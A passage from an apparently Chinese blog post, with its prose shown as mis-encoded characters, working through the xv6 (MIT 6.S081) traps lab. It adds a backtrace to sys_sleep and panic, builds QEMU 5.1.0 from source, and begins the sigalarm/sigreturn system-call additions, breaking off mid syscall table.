class="hljs-meta-string">&quot;kernel/stat.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;user/user.h&quot;</span></span><br><br><span class="hljs-function"><span class="hljs-keyword">int</span></span><br><span class="hljs-function"><span class="hljs-title">main</span><span class="hljs-params">(<span class="hljs-keyword">int</span> argc, <span class="hljs-keyword">char</span> *argv[])</span></span><br><span class="hljs-function"></span>&#123;<br>  sleep(<span class="hljs-number">1</span>);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">0</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>å› æ­¤bttestä½œä¸ºæµ‹è¯•æ–‡ä»¶ä¼šè°ƒç”¨sleepï¼Œä¹Ÿå³æ˜¯sys_sleepã€‚æˆ‘ä»¬åœ¨sys_sleepä¸­åŠ å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function">uint64</span><br><span class="hljs-function"><span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span><br><span class="hljs-function"></span>&#123;<br>  <span class="hljs-keyword">int</span> n;<br>  uint ticks0;<br>  <span class="hljs-keyword">if</span>(argint(<span class="hljs-number">0</span>, &amp;n) &lt; <span class="hljs-number">0</span>)<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  acquire(&amp;tickslock);<br>  ticks0 = ticks;<br>  <span class="hljs-keyword">while</span>(ticks - ticks0 &lt; n)&#123;<br>    <span class="hljs-keyword">if</span>(myproc()-&gt;killed)&#123;<br>      release(&amp;tickslock);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>    sleep(&amp;ticks, &amp;tickslock);<br>  &#125;<br>  release(&amp;tickslock);<br>  backtrace();<span class="hljs-comment">// </span><br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„è¯ï¼Œsleepè¿”å›ä¹‹å‰ä¼šè°ƒç”¨backtraceå‡½æ•°</p><p>ç±»ä¼¼çš„ï¼Œä¸ºäº†æ›´å¥½çš„debugï¼Œåœ¨panicå‡½æ•°ä¸­åŠ å…¥å¦‚ä¸‹ä»£ç ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span></span><br><span class="hljs-function"><span class="hljs-title">panic</span><span class="hljs-params">(<span class="hljs-keyword">char</span> *s)</span></span><br><span class="hljs-function"></span>&#123;<br>  pr.locking = <span class="hljs-number">0</span>;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;panic: &quot;</span>);<br>  <span class="hljs-built_in">printf</span>(s);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\n&quot;</span>);<br>  backtrace();<br>  panicked = <span class="hljs-number">1</span>; <span class="hljs-comment">// freeze uart output from other CPUs</span><br>  <span class="hljs-keyword">for</span>(;;)<br>    ;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·ä¼šåœ¨panicè¾“å‡ºä¹‹åï¼Œæ‰“å°å‡ºè¿”å›åœ°å€</p><blockquote><p>ps ï¼šåšåˆ°æ­¤å¤„å‘ç°äº†çš„qemuå¡æ­»çš„é—®é¢˜ï¼Œå‘ç°æ˜¯2020ç‰ˆæœ¬labçš„ä¼ ç»Ÿè‰ºèƒ½ã€‚apt remove qemu*ä¹‹åä½¿ç”¨æºç ç¼–è¯‘qemu5ç‰ˆæœ¬å³å¯</p><p>Next, retrieve and extract the source for QEMU 5.1.0:</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs elixir"><span class="hljs-variable">$ </span>wget <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/download.qemu.org/qemu</span><span class="hljs-number">-5.1</span>.0.tar.xz<br><span class="hljs-variable">$ </span>tar xf qemu<span class="hljs-number">-5.1</span>.0.tar.xz<br></code></pre></td></tr></table></figure><p>Build QEMU for riscv64-softmmu:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">$ <span class="hljs-keyword">cd</span> qemu-5.1.0<br>$ <span class="hljs-string">./configure</span> <span class="hljs-params">--disable-kvm</span> <span class="hljs-params">--disable-werror</span> <span class="hljs-params">--prefix=/usr/local</span> <span class="hljs-params">--target-list=</span><span class="hljs-string">&quot;riscv64-softmmu&quot;</span><br>$ make<br>$ sudo make install<br>$ <span class="hljs-keyword">cd</span> <span class="hljs-string">..</span><br></code></pre></td></tr></table></figure></blockquote><h1 id="Alarm-hard"><a href="#Alarm-hard" class="headerlink" title="Alarm (hard)"></a>Alarm (<a href="https://pdos.csail.mit.edu/6.S081/2020/labs/guidance.html">hard</a>)</h1><p>ç›®æ ‡ï¼š</p><p>å‘ xv6æ·»åŠ ä¸€ä¸ªç‰¹æ€§ï¼Œå®ƒå°†åœ¨è¿›ç¨‹ä½¿ç”¨ CPU æ—¶é—´æ—¶<strong>å‘¨æœŸæ€§</strong>å‘å‡ºè­¦æŠ¥ã€‚æ›´ä¸€èˆ¬åœ°è¯´ï¼Œå®ç°ç”¨æˆ·çº§ä¸­æ–­/é”™è¯¯å¤„ç†ç¨‹åºçš„åŸºæœ¬å½¢å¼; ä¾‹å¦‚ï¼Œå¯ä»¥ä½¿ç”¨ç±»ä¼¼çš„ä¸œè¥¿æ¥å¤„ç†åº”ç”¨ç¨‹åºä¸­çš„é¡µé¢é”™è¯¯ã€‚</p><p>hintï¼š</p><ul><li>æ·»åŠ ä¸€ä¸ªæ–°çš„ç³»ç»Ÿè°ƒç”¨sigalarm(interval, handler)ï¼Œå¦‚æœåº”ç”¨ç¨‹åºè°ƒç”¨ sigAlarm (nï¼Œfn) ï¼Œé‚£ä¹ˆåœ¨ç¨‹åºæ¶ˆè€—çš„æ¯ n ä¸ª CPU æ—¶é—´ä¹‹åï¼Œå†…æ ¸åº”è¯¥è°ƒç”¨åº”ç”¨ç¨‹åºå‡½æ•° fnã€‚å½“ fn è¿”å›æ—¶ï¼Œåº”ç”¨ç¨‹åºåº”è¯¥ä»åœæ­¢çš„åœ°æ–¹æ¢å¤</li><li>å¦‚æœä¸€ä¸ªåº”ç”¨ç¨‹åºè°ƒç”¨ sigAlarm (0,0) ï¼Œå†…æ ¸åº”è¯¥åœæ­¢ç”Ÿæˆå‘¨æœŸæ€§çš„alarmè°ƒç”¨</li><li>user/alarmtest.cæ˜¯æµ‹è¯•æ–‡ä»¶ï¼Œéœ€è¦å°†å…¶æ·»åŠ åˆ°makefileã€‚æ·»åŠ äº† sigAlarm å’Œ sigreturn ç³»ç»Ÿè°ƒç”¨ï¼Œå®ƒæ‰èƒ½æ­£ç¡®ç¼–è¯‘</li><li>å¯ä»¥åœ¨ user/alarmtest.asm ä¸­çœ‹åˆ° alarmtest çš„æ±‡ç¼–ä»£ç ï¼Œè¿™å¯èƒ½æœ‰åŠ©äºè°ƒè¯•</li><li>alarmtest ä¸­åœ¨ test0 è°ƒç”¨äº† sigalarm(2, periodic)ï¼Œè¦æ±‚å†…æ ¸å¼ºåˆ¶æ¯éš”2ä¸ªtickè°ƒç”¨ period () ï¼Œç„¶åspinä¸€æ®µæ—¶é—´</li></ul><p>test0ï¼šä¿®æ”¹å†…æ ¸ä»¥è·³è½¬åˆ°ç”¨æˆ·ç©ºé—´ä¸­çš„è­¦æŠ¥å¤„ç†ç¨‹åº</p><p>å…ˆä¿®æ”¹makefileç¼–è¯‘å‡ºalarmtest</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs c">UPROGS=\<br>$U/_cat\<br>$U/_echo\<br>$U/_forktest\<br>$U/_grep\<br>$U/_init\<br>$U/_kill\<br>$U/_ln\<br>$U/_ls\<br>$U/_mkdir\<br>$U/_rm\<br>$U/_sh\<br>$U/_stressfs\<br>$U/_usertests\<br>$U/_grind\<br>$U/_wc\<br>$U/_zombie\<br>$U/_alarmtest\<br></code></pre></td></tr></table></figure><p>æ”¾å…¥ user/user.h ä¸­çš„æ­£ç¡®å£°æ˜:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// system calls</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">int</span> ticks, <span class="hljs-keyword">void</span> (*handler)())</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exit</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span> __<span class="hljs-title">attribute__</span><span class="hljs-params">((noreturn))</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">wait</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">pipe</span><span class="hljs-params">(<span class="hljs-keyword">int</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">write</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">read</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">close</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">kill</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">exec</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span>**)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">open</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mknod</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">short</span>, <span class="hljs-keyword">short</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">unlink</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">fstat</span><span class="hljs-params">(<span class="hljs-keyword">int</span> fd, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">link</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">mkdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">chdir</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">dup</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">sbrk</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">sleep</span><span class="hljs-params">(<span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><br><span class="hljs-comment">// ulib.c</span><br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">stat</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, struct stat*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strcpy</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memmove</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">strchr</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">char</span> c)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">strcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">fprintf</span><span class="hljs-params">(<span class="hljs-keyword">int</span>, <span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">printf</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*, ...)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">char</span>* <span class="hljs-title">gets</span><span class="hljs-params">(<span class="hljs-keyword">char</span>*, <span class="hljs-keyword">int</span> max)</span></span>;<br><span class="hljs-function">uint <span class="hljs-title">strlen</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">memset</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*, <span class="hljs-keyword">int</span>, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span>* <span class="hljs-title">malloc</span><span class="hljs-params">(uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">free</span><span class="hljs-params">(<span class="hljs-keyword">void</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">atoi</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span>*)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">memcmp</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">void</span> *<span class="hljs-title">memcpy</span><span class="hljs-params">(<span class="hljs-keyword">void</span> *, <span class="hljs-keyword">const</span> <span class="hljs-keyword">void</span> *, uint)</span></span>;<br></code></pre></td></tr></table></figure><p>æ›´æ–° user/usys.pl (ç”Ÿæˆ user/usys.S)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c">#!/usr/bin/perl -w<br><br># Generate usys.S, the stubs <span class="hljs-keyword">for</span> syscalls.<br><br>print <span class="hljs-string">&quot;# generated by usys.pl - do not edit\n&quot;</span>;<br><br>print <span class="hljs-string">&quot;#include \&quot;kernel/syscall.h\&quot;\n&quot;</span>;<br><br>sub entry &#123;<br>    my $name = shift;<br>    print <span class="hljs-string">&quot;.global $name\n&quot;</span>;<br>    print <span class="hljs-string">&quot;$&#123;name&#125;:\n&quot;</span>;<br>    print <span class="hljs-string">&quot; li a7, SYS_$&#123;name&#125;\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ecall\n&quot;</span>;<br>    print <span class="hljs-string">&quot; ret\n&quot;</span>;<br>&#125;<br><br>entry(<span class="hljs-string">&quot;fork&quot;</span>);<br>entry(<span class="hljs-string">&quot;exit&quot;</span>);<br>entry(<span class="hljs-string">&quot;wait&quot;</span>);<br>entry(<span class="hljs-string">&quot;pipe&quot;</span>);<br>entry(<span class="hljs-string">&quot;read&quot;</span>);<br>entry(<span class="hljs-string">&quot;write&quot;</span>);<br>entry(<span class="hljs-string">&quot;close&quot;</span>);<br>entry(<span class="hljs-string">&quot;kill&quot;</span>);<br>entry(<span class="hljs-string">&quot;exec&quot;</span>);<br>entry(<span class="hljs-string">&quot;open&quot;</span>);<br>entry(<span class="hljs-string">&quot;mknod&quot;</span>);<br>entry(<span class="hljs-string">&quot;unlink&quot;</span>);<br>entry(<span class="hljs-string">&quot;fstat&quot;</span>);<br>entry(<span class="hljs-string">&quot;link&quot;</span>);<br>entry(<span class="hljs-string">&quot;mkdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;chdir&quot;</span>);<br>entry(<span class="hljs-string">&quot;dup&quot;</span>);<br>entry(<span class="hljs-string">&quot;getpid&quot;</span>);<br>entry(<span class="hljs-string">&quot;sbrk&quot;</span>);<br>entry(<span class="hljs-string">&quot;sleep&quot;</span>);<br>entry(<span class="hljs-string">&quot;uptime&quot;</span>);<br>entry(<span class="hljs-string">&quot;sigalarm&quot;</span>);<span class="hljs-comment">//</span><br>entry(<span class="hljs-string">&quot;sigreturn&quot;</span>);<span class="hljs-comment">//</span><br></code></pre></td></tr></table></figure><p> kernel/syscall.h </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">// System call numbers</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fork    1</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exit    2</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_wait    3</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_pipe    4</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_read    5</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_kill    6</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_exec    7</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_fstat   8</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_chdir   9</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_dup    10</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_getpid 11</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sbrk   12</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sleep  13</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_uptime 14</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_open   15</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_write  16</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mknod  17</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_unlink 18</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_link   19</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_mkdir  20</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_close  21</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigalarm 22</span><br><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> SYS_sigreturn 23</span><br></code></pre></td></tr></table></figure><p>kernel/syscall.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs c"><br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_chdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_close</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_dup</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exec</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_exit</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fork</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_fstat</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_getpid</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_kill</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_link</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mkdir</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_mknod</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_open</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_pipe</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_read</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sbrk</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sleep</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_unlink</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_wait</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_write</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_uptime</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigalarm</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">extern</span> uint64 <span class="hljs-title">sys_sigreturn</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span></span>;<span class="hljs-comment">//</span><br><br><span class="hljs-function"><span class="hljs-keyword">static</span> <span class="hljs-title">uint64</span> <span class="hljs-params">(*syscalls[])</span><span class="hljs-params">(<span class="hljs-keyword">void</span>)</span> </span>= &#123;<br>[SYS_fork]    sys_fork,<br>[SYS_exit]    sys_exit,<br>[SYS_wait]    sys_wait,<br>[SYS_pipe]    sys_pipe,<br>[SYS_read]    sys_read,<br>[SYS_kill]    sys_kill,<br>[SYS_exec]    sys_exec,<br>[SYS_fstat]   sys_fstat,<br>[SYS_chdir]   sys_chdir,<br>[SYS_dup]     sys_dup,<br>[SYS_getpid]  sys_getpid,<br>[SYS_sbrk]    sys_sbrk,<br>[SYS_sleep]   